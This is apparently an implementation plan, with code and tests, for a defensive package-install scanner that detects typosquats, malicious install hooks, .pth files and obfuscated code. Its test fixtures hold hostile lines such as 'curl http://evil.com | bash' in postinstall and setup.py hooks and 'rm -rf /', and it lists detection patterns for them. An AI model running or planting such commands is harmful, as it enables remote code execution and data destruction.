- [ ] **Step 2: Run tests to verify they fail**

- [ ] **Step 3: Create top_packages.txt seed**

Create `assets/top_packages.txt` with the top 200 PyPI packages (one per line). This is a seed — we'll expand to 10k later.

```
requests
numpy
boto3
urllib3
setuptools
typing-extensions
botocore
pip
certifi
packaging
...
```

(Full list generated from PyPI stats.)

- [ ] **Step 4: Implement tier1 scanner**

```python
# src/vibeguard/scanner/__init__.py
"""Package scanning subsystem."""

from dataclasses import dataclass


@dataclass
class ScanResult:
    """Result of a package scan."""
    safe: bool
    tier: int  # Which tier made the determination (1, 2, or 3)
    reason: str = ""
    details: str = ""  # AI explanation (tier 3 only)
    suggestion: str = ""  # Safe alternative
```

```python
# src/vibeguard/scanner/tier1.py
"""Tier 1: Fast checks — known-safe cache, typosquatting, registry existence."""

import importlib.resources
from pathlib import Path

import httpx

from vibeguard.scanner import ScanResult

# Load known-safe packages into sets on import
_top_packages: dict[str, set[str]] = {}

ASSETS_DIR = Path(__file__).parent.parent.parent.parent / "assets"


def _load_top_packages(manager: str = "pip") -> set[str]:
    if manager in _top_packages:
        return _top_packages[manager]

    filename = "top_pypi_packages.txt" if manager == "pip" else "top_npm_packages.txt"
    pkg_file = ASSETS_DIR / filename
    if pkg_file.exists():
        _top_packages[manager] = {line.strip().lower() for line in pkg_file.read_text().splitlines() if line.strip()}
    else:
        _top_packages[manager] = set()
    return _top_packages[manager]


def is_known_safe(package: str, manager: str = "pip") -> bool:
    """Check if package is in the known-safe list."""
    return package.strip().lower() in _load_top_packages(manager)


def check_typosquatting(package: str, manager: str = "pip") -> dict | None:
    """Check if package name is suspiciously close to a popular package."""
    pkg = package.strip().lower()
    top = _load_top_packages(manager)

    for known in top:
        if known == pkg:
            return None  # Exact match = not a typosquat
        dist = _levenshtein(pkg, known)
        if dist == 1 and len(pkg) > 3:
            return {"similar_to": known, "distance": dist}
        # Also check common substitutions
        if _is_substitution_squat(pkg, known):
            return {"similar_to": known, "distance": dist}

    return None


def check_package_exists(package: str, manager: str = "pip") -> bool:
    """Check if package exists on the registry."""
    try:
        if manager == "pip":
            resp = httpx.head(f"https://pypi.org/pypi/{package}/json", timeout=5, follow_redirects=True)
        elif manager == "npm":
            resp = httpx.head(f"https://registry.npmjs.org/{package}", timeout=5, follow_redirects=True)
        else:
            return True
        return resp.status_code == 200
    except httpx.HTTPError:
        return True  # Assume exists on network error (fail open for availability)


def tier1_scan(package: str, *, manager: str = "pip") -> ScanResult:
    """Run all tier 1 checks. Returns immediately for known-safe packages."""
    # Check 1: Known safe
    if is_known_safe(package, manager):
        return ScanResult(safe=True, tier=1)

    # Check 2: Typosquatting
    typo = check_typosquatting(package, manager)
    if typo:
        return ScanResult(
            safe=False,
            tier=1,
            reason=f"Possible typosquat — similar to '{typo['similar_to']}'",
            suggestion=f"Did you mean: {typo['similar_to']}",
        )

    # Check 3: Package exists on registry
    if not check_package_exists(package, manager):
        registry = "npm" if manager == "npm" else "PyPI"
        return ScanResult(
            safe=False,
            tier=1,
            reason=f"Package does not exist on {registry}",
            suggestion="This may be a hallucinated package name from an AI tool (slopsquatting)",
        )

    # Not known-safe but no red flags — needs tier 2
    return ScanResult(safe=True, tier=1, reason="not in known-safe list, passed basic checks")


def _levenshtein(s1: str, s2: str) -> int:
    """Compute Levenshtein distance between two strings."""
    if len(s1) < len(s2):
        return _levenshtein(s2, s1)
    if len(s2) == 0:
        return len(s1)

    prev = list(range(len(s2) + 1))
    for i, c1 in enumerate(s1):
        curr = [i + 1]
        for j, c2 in enumerate(s2):
            insertions = prev[j + 1] + 1
            deletions = curr[j] + 1
            substitutions = prev[j] + (c1 != c2)
            curr.append(min(insertions, deletions, substitutions))
        prev = curr
    return prev[-1]


def _is_substitution_squat(pkg: str, known: str) -> bool:
    """Check for common character substitution attacks (e.g., 0 for o, 1 for l)."""
    subs = {"0": "o", "o": "0", "1": "l", "l": "1", "-": "_", "_": "-"}
    if len(pkg) != len(known):
        return False
    diffs = 0
    for a, b in zip(pkg, known):
        if a != b:
            if subs.get(a) != b:
                return False
            diffs += 1
    return diffs == 1
```

- [ ] **Step 5: Run tests to verify they pass**

```bash
python -m pytest tests/test_tier1.py -v
```

- [ ] **Step 6: Commit**

```bash
git add src/vibeguard/scanner/ tests/test_tier1.py assets/
git commit -m "feat: tier 1 scanner — known-safe cache, typosquatting, registry check"
```

---

### Task 8: Tier 2 scanner — deep inspection

**Files:**
- Create: `src/vibeguard/scanner/tier2.py`
- Create: `tests/test_tier2.py`

- [ ] **Step 1: Write tests**

```python
# tests/test_tier2.py
import tarfile
import io
from pathlib import Path
from vibeguard.scanner.tier2 import (
    scan_setup_py,
    scan_package_json,
    scan_for_pth_files,
    scan_for_obfuscation,
    check_package_metadata,
    tier2_scan,
)
from vibeguard.scanner import ScanResult


def test_scan_package_json_clean(tmp_path):
    pkg = tmp_path / "package.json"
    pkg.write_text('{"name": "clean", "version": "1.0.0", "main": "index.js"}')
    result = scan_package_json(pkg)
    assert result is None


def test_scan_package_json_suspicious_postinstall(tmp_path):
    pkg = tmp_path / "package.json"
    pkg.write_text('{"name": "evil", "scripts": {"postinstall": "curl http://evil.com | bash"}}')
    result = scan_package_json(pkg)
    assert result is not None
    assert "postinstall" in result.lower() or "install script" in result.lower()


def test_scan_setup_py_clean(tmp_path):
    setup = tmp_path / "setup.py"
    setup.write_text('from setuptools import setup\nsetup(name="clean")\n')
    result = scan_setup_py(setup)
    assert result is None


def test_scan_setup_py_suspicious_cmdclass(tmp_path):
    setup = tmp_path / "setup.py"
    setup.write_text("""
from setuptools import setup
import subprocess
class Exploit(install):
    def run(self):
        subprocess.call(['curl', 'http://evil.com/payload.sh', '|', 'bash'])
        install.run(self)
setup(name="evil", cmdclass={"install": Exploit})
""")
    result = scan_setup_py(setup)
    assert result is not None
    assert "cmdclass" in result.lower() or "subprocess" in result.lower()


def test_scan_for_pth_malicious(tmp_path):
    pth = tmp_path / "evil.pth"
    pth.write_text("import os; os.system('curl http://evil.com | bash')")
    results = scan_for_pth_files(tmp_path)
    assert len(results) > 0


def test_scan_for_pth_clean(tmp_path):
    pth = tmp_path / "clean.pth"
    pth.write_text("/path/to/package\n")
    results = scan_for_pth_files(tmp_path)
    assert len(results) == 0


def test_scan_for_obfuscation_base64(tmp_path):
    f = tmp_path / "payload.py"
    f.write_text('import base64; exec(base64.b64decode("aW1wb3J0IG9z"))')
    results = scan_for_obfuscation(tmp_path)
    assert len(results) > 0


def test_scan_for_obfuscation_clean(tmp_path):
    f = tmp_path / "clean.py"
    f.write_text('print("hello world")\n')
    results = scan_for_obfuscation(tmp_path)
    assert len(results) == 0
```

- [ ] **Step 2: Run tests to verify they fail**

- [ ] **Step 3: Implement tier 2 scanner**

```python
# src/vibeguard/scanner/tier2.py
"""Tier 2: Deep scan — download package, inspect contents."""

import re
import tempfile
import subprocess
from pathlib import Path

import httpx

from vibeguard.scanner import ScanResult

# Suspicious patterns in setup.py
SETUP_PY_PATTERNS = [
    (r"cmdclass\s*=", "cmdclass override (custom install hook)"),
    (r"subprocess\.(call|run|Popen)", "subprocess execution in setup.py"),
    (r"os\.system\s*\(", "os.system call in setup.py"),
    (r"exec\s*\(", "exec() call in setup.py"),
    (r"eval\s*\(", "eval() call in setup.py"),
    (r"urllib\.request|requests\.get|httpx\.(get|post)", "network call in setup.py"),
    (r"curl\s|wget\s", "curl/wget in setup.py"),
]

# Obfuscation patterns
OBFUSCATION_PATTERNS = [
    (r"exec\s*\(\s*base64\.b64decode", "exec(base64.b64decode(...)) — obfuscated execution"),
    (r"exec\s*\(\s*codecs\.decode", "exec(codecs.decode(...)) — obfuscated execution"),
    (r"exec\s*\(\s*bytes\.fromhex", "exec(bytes.fromhex(...)) — hex-encoded execution"),
    (r"__import__\s*\(\s*['\"]base64", "dynamic base64 import"),
    (r"exec\s*\(\s*compile\s*\(", "exec(compile(...)) — dynamic code compilation"),
    (r"\\x[0-9a-f]{2}.*\\x[0-9a-f]{2}.*\\x[0-9a-f]{2}", "heavy hex-escaped strings"),
    (r"exec\s*\(\s*['\"]", "exec() with string literal"),
    (r"eval\s*\(\s*['\"]", "eval() with string literal"),
]

# Suspicious .pth patterns (normal .pth files just contain paths)
PTH_SUSPICIOUS = [
    (r"import\s", "import statement in .pth file"),
    (r"exec\s*\(", "exec() in .pth file"),
    (r"os\.", "os module usage in .pth file"),
    (r"subprocess", "subprocess in .pth file"),
    (r"__import__", "dynamic import in .pth file"),
]


def scan_setup_py(setup_path: Path) -> str | None:
    """Scan a setup.py file for suspicious patterns. Returns description if suspicious, None if clean."""
    if not setup_path.exists():
        return None

    content = setup_path.read_text(errors="ignore")
    for pattern, desc in SETUP_PY_PATTERNS:
        if re.search(pattern, content):
            return desc
    return None


# npm-specific suspicious install script patterns
NPM_SCRIPT_PATTERNS = [
    (r"curl\s|wget\s", "downloads external payload"),
    (r"eval\s*\(", "eval() in install script"),
    (r"\|\s*bash", "pipes to bash"),
    (r"\|\s*sh", "pipes to shell"),
    (r"node\s+-e\s+", "inline node execution"),
    (r"powershell", "PowerShell execution"),
    (r"http[s]?://", "network call in install script"),
]


def scan_package_json(package_json_path: Path) -> str | None:
    """Scan a package.json for suspicious install scripts."""
    if not package_json_path.exists():
        return None

    import json
    try:
        data = json.loads(package_json_path.read_text(errors="ignore"))
    except json.JSONDecodeError:
        return None

    scripts = data.get("scripts", {})
    suspicious_hooks = ["preinstall", "install", "postinstall", "preuninstall"]

    for hook in suspicious_hooks:
        script = scripts.get(hook, "")
        if not script:
            continue
        for pattern, desc in NPM_SCRIPT_PATTERNS:
            if re.search(pattern, script, re.IGNORECASE):
                return f"suspicious {hook} script: {desc}"

    return None


def scan_for_pth_files(package_dir: Path) -> list[dict]:
    """Scan for malicious .pth files in package."""
    findings = []
    for pth in package_dir.rglob("*.pth"):
        content = pth.read_text(errors="ignore")
        for pattern, desc in PTH_SUSPICIOUS:
            if re.search(pattern, content):
                findings.append({"file": str(pth.name), "reason": desc, "content": content[:200]})
                break
    return findings


def scan_for_obfuscation(package_dir: Path) -> list[dict]:
    """Scan Python files for obfuscated code patterns."""
    findings = []
    for src_file in list(package_dir.rglob("*.py")) + list(package_dir.rglob("*.js")):
        try:
            content = src_file.read_text(errors="ignore")
        except (OSError, UnicodeDecodeError):
            continue

        for pattern, desc in OBFUSCATION_PATTERNS:
            if re.search(pattern, content):
                findings.append({"file": str(src_file.name), "reason": desc})
                break
    return findings


def check_package_metadata(package: str, manager: str = "pip") -> dict | None:
    """Check registry metadata for red flags (new package, low downloads, etc.)."""
    try:
        if manager == "npm":
            return _check_npm_metadata(package)
        return _check_pypi_metadata(package)
    except httpx.HTTPError:
        return None


def _check_pypi_metadata(package: str) -> dict | None:
    resp = httpx.get(f"https://pypi.org/pypi/{package}/json", timeout=10)
    if resp.status_code != 200:
        return None

    data = resp.json()
    info = data.get("info", {})
    flags = []

    releases = data.get("releases", {})
    if releases and len(list(releases.keys())) <= 1:
        flags.append("single release (brand new package)")

    if not info.get("home_page") and not info.get("project_urls"):
        flags.append("no project URL")

    if not info.get("summary") and not info.get("description"):
        flags.append("no description")

    return {"flags": flags, "name": package} if flags else None


def _check_npm_metadata(package: str) -> dict | None:
    resp = httpx.get(f"https://registry.npmjs.org/{package}", timeout=10)
    if resp.status_code != 200:
        return None

    data = resp.json()
    flags = []

    time_data = data.get("time", {})
    versions = [k for k in time_data if k not in ("created", "modified")]
    if len(versions) <= 1:
        flags.append("single release (brand new package)")

    if not data.get("repository"):
        flags.append("no repository URL")

    if not data.get("description"):
        flags.append("no description")

    return {"flags": flags, "name": package} if flags else None


def download_and_scan(package: str, version: str = "", manager: str = "pip") -> ScanResult:
    """Download a package to temp dir and run tier 2 scans."""
    with tempfile.TemporaryDirectory() as tmp:
        tmp_path = Path(tmp)

        # Download package (no install)
        if manager == "npm":
            cmd = ["npm", "pack", f"{package}@{version}" if version else package, "--pack-destination", str(tmp_path)]
        else:
            cmd = ["pip", "download", "--no-deps", "-d", str(tmp_path), package]
            if version:
                cmd[-1] = f"{package}=={version}"

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if result.returncode != 0:
            return ScanResult(safe=True, tier=2, reason="could not download for inspection")

        # Extract the downloaded archive
        extract_dir = tmp_path / "extracted"
        extract_dir.mkdir()

        for archive in tmp_path.iterdir():
            if archive.suffix in (".gz", ".whl", ".zip", ".tgz"):
                _extract(archive, extract_dir)

        # Run scans
        all_findings = []

        if manager == "pip":
            # Scan setup.py
            for setup in extract_dir.rglob("setup.py"):
                finding = scan_setup_py(setup)
                if finding:
                    all_findings.append(f"setup.py: {finding}")

            # Scan .pth files
            pth_findings = scan_for_pth_files(extract_dir)
            for f in pth_findings:
                all_findings.append(f".pth file: {f['reason']}")

        elif manager == "npm":
            # Scan package.json for suspicious install scripts
            for pkg_json in extract_dir.rglob("package.json"):
                finding = scan_package_json(pkg_json)
                if finding:
                    all_findings.append(f"package.json: {finding}")

        # Scan for obfuscation (both pip and npm)
        obf_findings = scan_for_obfuscation(extract_dir)
        for f in obf_findings:
            all_findings.append(f"obfuscated code: {f['reason']} in {f['file']}")

        if all_findings:
            return ScanResult(
                safe=False,
                tier=2,
                reason="; ".join(all_findings),
            )

        return ScanResult(safe=True, tier=2)


def tier2_scan(package: str, version: str = "", manager: str = "pip") -> ScanResult:
    """Run all tier 2 checks."""
    # Check metadata first (no download needed)
    meta = check_package_metadata(package, manager)

    # Download and scan
    result = download_and_scan(package, version, manager)

    # Augment with metadata flags if both are concerning
    if meta and not result.safe:
        result.reason = f"metadata: {', '.join(meta['flags'])}; {result.reason}"

    return result


def _extract(archive: Path, dest: Path):
    """Extract a package archive."""
    import tarfile
    import zipfile

    if archive.name.endswith(".tar.gz") or archive.name.endswith(".tgz"):
        with tarfile.open(archive, "r:gz") as tar:
            tar.extractall(dest, filter="data")
    elif archive.name.endswith(".whl") or archive.name.endswith(".zip"):
        with zipfile.ZipFile(archive) as zf:
            zf.extractall(dest)
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
python -m pytest tests/test_tier2.py -v
```

- [ ] **Step 5: Commit**

```bash
git add src/vibeguard/scanner/tier2.py tests/test_tier2.py
git commit -m "feat: tier 2 scanner — setup.py, .pth, obfuscation, metadata checks"
```

---

## Chunk 4: AI Provider System + Tier 3

### Task 9: AI provider base + Anthropic provider

**Files:**
- Create: `src/vibeguard/ai/__init__.py`
- Create: `src/vibeguard/ai/base.py`
- Create: `src/vibeguard/ai/anthropic.py`
- Create: `tests/test_ai_anthropic.py`

- [ ] **Step 1: Write tests**

```python
# tests/test_ai_anthropic.py
from unittest.mock import patch, MagicMock
from vibeguard.ai.anthropic import AnthropicProvider
from vibeguard.ai.base import AnalysisResult


def test_anthropic_api_key_provider_init():
    provider = AnthropicProvider(api_key="sk-ant-test-123")
    assert provider.is_configured()


def test_anthropic_oauth_provider_init():
    provider = AnthropicProvider(oauth_token="token-test-456")
    assert provider.is_configured()


def test_anthropic_unconfigured():
    provider = AnthropicProvider()
    assert not provider.is_configured()


def test_anthropic_analyze_formats_prompt():
    provider = AnthropicProvider(api_key="sk-ant-test")
    prompt = provider._build_prompt("evil.py", "import os; os.system('rm -rf /')")
    assert "evil.py" in prompt
    assert "os.system" in prompt
```

- [ ] **Step 2: Run tests to verify they fail**

- [ ] **Step 3: Implement AI base and Anthropic provider**

```python
# src/vibeguard/ai/__init__.py
"""AI analysis providers."""
```

```python
# src/vibeguard/ai/base.py
"""Base AI provider protocol."""

from dataclasses import dataclass
from typing import Protocol


@dataclass
class AnalysisResult:
    """Result from AI analysis."""
    explanation: str
    risk_level: str  # "critical", "high", "medium", "low", "safe"
    remediation: str = ""
    safe_alternative: str = ""


class AIProvider(Protocol):
    """Protocol for AI analysis providers."""

    def is_configured(self) -> bool: ...
    def analyze_package(self, package_name: str, suspicious_code: str, context: str = "") -> AnalysisResult: ...
    def analyze_code(self, code: str, filename: str = "") -> AnalysisResult: ...
```

```python
# src/vibeguard/ai/anthropic.py
"""Anthropic Claude AI provider."""

import httpx

from vibeguard.ai.base import AIProvider, AnalysisResult

ANTHROPIC_API_URL = "https://api.anthropic.com/v1/messages"
DEFAULT_MODEL = "claude-sonnet-4-20250514"


class AnthropicProvider:
    """Anthropic Claude provider — supports API key and OAuth."""

    def __init__(self, *, api_key: str = "", oauth_token: str = ""):
        self._api_key = api_key
        self._oauth_token = oauth_token

    def is_configured(self) -> bool:
        return bool(self._api_key or self._oauth_token)

    def analyze_package(self, package_name: str, suspicious_code: str, context: str = "") -> AnalysisResult:
        prompt = self._build_prompt(package_name, suspicious_code, context)
        return self._call_api(prompt)

    def analyze_code(self, code: str, filename: str = "") -> AnalysisResult:
        prompt = f"""You are a security analyst. Analyze this code for security issues.

File: {filename or 'unknown'}

```
{code[:4000]}
```

Respond in this exact format:
RISK: <critical|high|medium|low|safe>
EXPLANATION: <what this code does and why it's concerning, in 2-3 sentences>
REMEDIATION: <what the developer should do>
ALTERNATIVE: <safe package or approach if applicable>"""

        return self._call_api(prompt)

    def _build_prompt(self, package_name: str, code: str, context: str = "") -> str:
        return f"""You are a security analyst specializing in supply chain attacks. Analyze this suspicious code found in the Python package "{package_name}".

{f"Context: {context}" if context else ""}

```python
{code[:4000]}
```

Respond in this exact format:
RISK: <critical|high|medium|low|safe>
EXPLANATION: <what this code does and why it's dangerous, in 2-3 sentences, plain English>
REMEDIATION: <what the developer should do instead>
ALTERNATIVE: <safe package name and version if applicable>"""

    def _call_api(self, prompt: str) -> AnalysisResult:
        headers = {"content-type": "application/json", "anthropic-version": "2023-06-01"}

        if self._api_key:
            headers["x-api-key"] = self._api_key
        elif self._oauth_token:
            headers["authorization"] = f"Bearer {self._oauth_token}"

        payload = {
            "model": DEFAULT_MODEL,
            "max_tokens": 500,
            "messages": [{"role": "user", "content": prompt}],
        }

        try:
            resp = httpx.post(ANTHROPIC_API_URL, json=payload, headers=headers, timeout=30)
            resp.raise_for_status()
            text = resp.json()["content"][0]["text"]
            return self._parse_response(text)
        except (httpx.HTTPError, KeyError, IndexError) as e:
            return AnalysisResult(
                explanation=f"AI analysis unavailable: {e}",
                risk_level="unknown",
            )

    def _parse_response(self, text: str) -> AnalysisResult:
        lines = text.strip().split("\n")
        result = {"risk": "unknown", "explanation": "", "remediation": "", "alternative": ""}

        for line in lines:
            upper = line.strip().upper()
            if upper.startswith("RISK:"):
                result["risk"] = line.split(":", 1)[1].strip().lower()
            elif upper.startswith("EXPLANATION:"):
                result["explanation"] = line.split(":", 1)[1].strip()
            elif upper.startswith("REMEDIATION:"):
                result["remediation"] = line.split(":", 1)[1].strip()
            elif upper.startswith("ALTERNATIVE:"):
                result["alternative"] = line.split(":", 1)[1].strip()

        return AnalysisResult(
            explanation=result["explanation"],
            risk_level=result["risk"],
            remediation=result["remediation"],
            safe_alternative=result["alternative"],
        )
```

- [ ] **Step 4: Run tests to verify they pass**

- [ ] **Step 5: Commit**

```bash
git add src/vibeguard/ai/ tests/test_ai_anthropic.py
git commit -m "feat: AI provider base protocol and Anthropic Claude provider"
```

---

### Task 10: OpenAI provider

**Files:**
- Create: `src/vibeguard/ai/openai_provider.py`
- Create: `tests/test_ai_openai.py`

- [ ] **Step 1: Write tests**

```python
# tests/test_ai_openai.py
from vibeguard.ai.openai_provider import OpenAIProvider


def test_openai_api_key_provider_init():
    provider = OpenAIProvider(api_key="sk-test-123")
    assert provider.is_configured()


def test_openai_oauth_provider_init():
    provider = OpenAIProvider(oauth_token="token-test-456")
    assert provider.is_configured()


def test_openai_unconfigured():
    provider = OpenAIProvider()
    assert not provider.is_configured()
```

- [ ] **Step 2: Implement OpenAI provider**

```python
# src/vibeguard/ai/openai_provider.py
"""OpenAI AI provider."""

import httpx

from vibeguard.ai.base import AnalysisResult

OPENAI_API_URL = "https://api.openai.com/v1/chat/completions"
DEFAULT_MODEL = "gpt-4o"


class OpenAIProvider:
    """OpenAI provider — supports API key and OAuth."""

    def __init__(self, *, api_key: str = "", oauth_token: str = ""):
        self._api_key = api_key
        self._oauth_token = oauth_token

    def is_configured(self) -> bool:
        return bool(self._api_key or self._oauth_token)

    def analyze_package(self, package_name: str, suspicious_code: str, context: str = "") -> AnalysisResult:
        prompt = self._build_prompt(package_name, suspicious_code, context)
        return self._call_api(prompt)

    def analyze_code(self, code: str, filename: str = "") -> AnalysisResult:
        prompt = f"""You are a security analyst. Analyze this code for security issues.

File: {filename or 'unknown'}

```
{code[:4000]}
```

Respond in this exact format:
RISK: <critical|high|medium|low|safe>
EXPLANATION: <what this code does and why it's concerning>
REMEDIATION: <what the developer should do>
ALTERNATIVE: <safe package or approach if applicable>"""
        return self._call_api(prompt)

    def _build_prompt(self, package_name: str, code: str, context: str = "") -> str:
        return f"""You are a security analyst specializing in supply chain attacks. Analyze this suspicious code found in the Python package "{package_name}".

{f"Context: {context}" if context else ""}

```python
{code[:4000]}
```

Respond in this exact format:
RISK: <critical|high|medium|low|safe>
EXPLANATION: <what this code does and why it's dangerous, plain English>
REMEDIATION: <what the developer should do instead>
ALTERNATIVE: <safe package name and version if applicable>"""

    def _call_api(self, prompt: str) -> AnalysisResult:
        token = self._api_key or self._oauth_token
        headers = {
            "content-type": "application/json",
            "authorization": f"Bearer {token}",
        }

        payload = {
            "model": DEFAULT_MODEL,
            "max_tokens": 500,
            "messages": [{"role": "user", "content": prompt}],
        }

        try:
            resp = httpx.post(OPENAI_API_URL, json=payload, headers=headers, timeout=30)
            resp.raise_for_status()
            text = resp.json()["choices"][0]["message"]["content"]
            return self._parse_response(text)
        except (httpx.HTTPError, KeyError, IndexError) as e:
            return AnalysisResult(
                explanation=f"AI analysis unavailable: {e}",
                risk_level="unknown",
            )

    def _parse_response(self, text: str) -> AnalysisResult:
        lines = text.strip().split("\n")
        result = {"risk": "unknown", "explanation": "", "remediation": "", "alternative": ""}
        for line in lines:
            upper = line.strip().upper()
            if upper.startswith("RISK:"):
                result["risk"] = line.split(":", 1)[1].strip().lower()
            elif upper.startswith("EXPLANATION:"):
                result["explanation"] = line.split(":", 1)[1].strip()
            elif upper.startswith("REMEDIATION:"):
                result["remediation"] = line.split(":", 1)[1].strip()
            elif upper.startswith("ALTERNATIVE:"):
                result["alternative"] = line.split(":", 1)[1].strip()
        return AnalysisResult(
            explanation=result["explanation"],
            risk_level=result["risk"],
            remediation=result["remediation"],
            safe_alternative=result["alternative"],
        )
```

- [ ] **Step 3: Run tests, commit**

```bash
python -m pytest tests/test_ai_openai.py -v
git add src/vibeguard/ai/openai_provider.py tests/test_ai_openai.py
git commit -m "feat: OpenAI provider for AI analysis"
```

---

### Task 11: Tier 3 scanner — AI analysis

**Files:**
- Create: `src/vibeguard/scanner/tier3.py`
- Create: `tests/test_tier3.py`

- [ ] **Step 1: Write tests**

```python
# tests/test_tier3.py
from unittest.mock import MagicMock
from vibeguard.scanner.tier3 import tier3_scan
from vibeguard.ai.base import AnalysisResult


def test_tier3_scan_with_no_provider():
    result = tier3_scan("evil-pkg", "import os; os.system('bad')", provider=None)
    assert result.tier == 3
    assert result.safe is True  # Can't determine without AI, don't block
    assert "no ai" in result.reason.lower() or "unavailable" in result.reason.lower()


def test_tier3_scan_with_provider():
    mock = MagicMock()
    mock.is_configured.return_value = True
    mock.analyze_package.return_value = AnalysisResult(
        explanation="Downloads and executes a remote payload",
        risk_level="critical",
        remediation="Remove this package",
        safe_alternative="safe-pkg v1.0",
    )

    result = tier3_scan("evil-pkg", "import os; os.system('bad')", provider=mock)
    assert result.safe is False
    assert result.tier == 3
    assert "payload" in result.details.lower()
```

- [ ] **Step 2: Implement tier 3**

```python
# src/vibeguard/scanner/tier3.py
"""Tier 3: AI-powered analysis of suspicious code."""

from vibeguard.scanner import ScanResult
from vibeguard.ai.base import AIProvider, AnalysisResult


def tier3_scan(package: str, suspicious_code: str, *, provider=None, context: str = "") -> ScanResult:
    """Send suspicious code to AI for analysis."""
    if provider is None or not provider.is_configured():
        return ScanResult(
            safe=True,
            tier=3,
            reason="AI analysis unavailable — no provider configured",
        )

    try:
        result: AnalysisResult = provider.analyze_package(package, suspicious_code, context)
    except Exception as e:
        return ScanResult(safe=True, tier=3, reason=f"AI analysis failed: {e}")

    is_dangerous = result.risk_level in ("critical", "high")

    return ScanResult(
        safe=not is_dangerous,
        tier=3,
        reason=f"AI risk assessment: {result.risk_level}",
        details=result.explanation,
        suggestion=result.safe_alternative or result.remediation,
    )
```

- [ ] **Step 3: Run tests, commit**

```bash
python -m pytest tests/test_tier3.py -v
git add src/vibeguard/scanner/tier3.py tests/test_tier3.py
git commit -m "feat: tier 3 AI-powered analysis scanner"
```

---

## Chunk 5: Interceptor + Full CLI Wiring

### Task 12: Package interceptor

**Files:**
- Create: `src/vibeguard/interceptor.py`
- Create: `tests/test_interceptor.py`

This is the core flow: parse pip args → tier 1 → tier 2 (if needed) → tier 3 (if needed) → allow or block.

- [ ] **Step 1: Write tests**

```python
# tests/test_interceptor.py
from unittest.mock import patch
from vibeguard.interceptor import parse_install_args, run_intercept


def test_parse_install_args_simple():
    packages = parse_install_args(["install", "flask"])
    assert packages == [("flask", "")]


def test_parse_install_args_with_version():
    packages = parse_install_args(["install", "flask==3.1.0"])
    assert packages == [("flask", "3.1.0")]


def test_parse_install_args_multiple():
    packages = parse_install_args(["install", "flask", "requests", "numpy"])
    assert len(packages) == 3


def test_parse_install_args_not_install():
    packages = parse_install_args(["list"])
    assert packages == []


def test_parse_install_args_with_flags():
    packages = parse_install_args(["install", "--upgrade", "flask", "-q"])
    assert packages == [("flask", "")]


def test_parse_install_args_requirements_file():
    packages = parse_install_args(["install", "-r", "requirements.txt"])
    assert packages == []  # We don't intercept -r for now


def test_parse_install_args_npm_simple():
    packages = parse_install_args(["install", "express"], manager="npm")
    assert packages == [("express", "")]


def test_parse_install_args_npm_with_version():
    packages = parse_install_args(["install", "express@4.18.0"], manager="npm")
    assert packages == [("express", "4.18.0")]


def test_parse_install_args_npm_add():
    packages = parse_install_args(["add", "lodash"], manager="npm")
    assert packages == [("lodash", "")]


def test_parse_install_args_npm_scoped():
    packages = parse_install_args(["install", "@angular/core"], manager="npm")
    assert packages == [("@angular/core", "")]


# --- npx / bunx (no "install" subcommand, just package name) ---

def test_parse_install_args_npx():
    packages = parse_install_args(["cowsay"], manager="npx")
    assert packages == [("cowsay", "")]


def test_parse_install_args_npx_with_version():
    packages = parse_install_args(["create-react-app@5.0.0"], manager="npx")
    assert packages == [("create-react-app", "5.0.0")]


def test_parse_install_args_npx_with_flags():
    packages = parse_install_args(["--yes", "cowsay", "hello"], manager="npx")
    assert packages == [("cowsay", "")]


def test_parse_install_args_bunx():
    packages = parse_install_args(["cowsay"], manager="bunx")
    assert packages == [("cowsay", "")]


# --- yarn / pnpm / bun (same as npm) ---

def test_parse_install_args_yarn_add():
    packages = parse_install_args(["add", "express"], manager="yarn")
    assert packages == [("express", "")]


def test_parse_install_args_pnpm_add():
    packages = parse_install_args(["add", "express@4.0.0"], manager="pnpm")
    assert packages == [("express", "4.0.0")]


def test_parse_install_args_bun_add():
    packages = parse_install_args(["add", "express"], manager="bun")
    assert packages == [("express", "")]


# --- uv (Python) ---

def test_parse_install_args_uv_pip_install():
    packages = parse_install_args(["pip", "install", "flask"], manager="uv")
    assert packages == [("flask", "")]


def test_parse_install_args_uv_add():
    packages = parse_install_args(["add", "flask"], manager="uv")
    assert packages == [("flask", "")]


def test_parse_install_args_uv_non_install():
    packages = parse_install_args(["run", "pytest"], manager="uv")
    assert packages == []


# --- pipx ---

def test_parse_install_args_pipx():
    packages = parse_install_args(["install", "black"], manager="pipx")
    assert packages == [("black", "")]
```

- [ ] **Step 2: Implement interceptor**

```python
# src/vibeguard/interceptor.py
"""Package install interception — the core scanning flow."""

import subprocess
import sys
import time

from vibeguard.config import load_config, save_config
from vibeguard.scanner import ScanResult
from vibeguard.scanner.tier1 import tier1_scan
from vibeguard.scanner.tier2 import tier2_scan
from vibeguard.scanner.tier3 import tier3_scan
from vibeguard.display import show_safe, show_blocked
from vibeguard.ai.anthropic import AnthropicProvider
from vibeguard.ai.openai_provider import OpenAIProvider


# Map each manager to its registry type for scanning
MANAGER_REGISTRY = {
    "pip": "pip",
    "pipx": "pip",
    "uv": "pip",
    "npm": "npm",
    "npx": "npm",
    "yarn": "npm",
    "pnpm": "npm",
    "bun": "npm",
    "bunx": "npm",
}


def get_registry(manager: str) -> str:
    """Get the registry type (pip or npm) for a given package manager."""
    return MANAGER_REGISTRY.get(manager, "pip")


def parse_install_args(args: list[str], manager: str = "pip") -> list[tuple[str, str]]:
    """Extract package names and versions from any supported package manager.

    Returns list of (package_name, version) tuples.
    """
    if not args:
        return []

    # --- npx / bunx: no "install" subcommand, first non-flag arg is the package ---
    if manager in ("npx", "bunx"):
        return _parse_exec_args(args)

    # --- uv: handle "uv pip install X" and "uv add X" ---
    if manager == "uv":
        return _parse_uv_args(args)

    # --- pipx: "pipx install X" / "pipx run X" ---
    if manager == "pipx":
        if args[0] not in ("install", "run"):
            return []
        return _parse_pip_packages(args[1:])

    # --- npm / yarn / pnpm / bun: "install", "add", "i" ---
    if manager in ("npm", "yarn", "pnpm", "bun"):
        install_cmds = {"install", "add", "i"}
        if args[0] not in install_cmds:
            return []
        return _parse_npm_packages(args[1:])

    # --- pip / pip3: "install" ---
    if args[0] != "install":
        return []
    return _parse_pip_packages(args[1:])


def _parse_exec_args(args: list[str]) -> list[tuple[str, str]]:
    """Parse npx/bunx args — first non-flag arg is the package to execute."""
    for arg in args:
        if arg.startswith("-"):
            continue
        # npx create-react-app@5.0.0
        if "@" in arg and not arg.startswith("@"):
            name, version = arg.rsplit("@", 1)
            return [(name.strip(), version.strip())]
        elif arg.startswith("@") and arg.count("@") == 2:
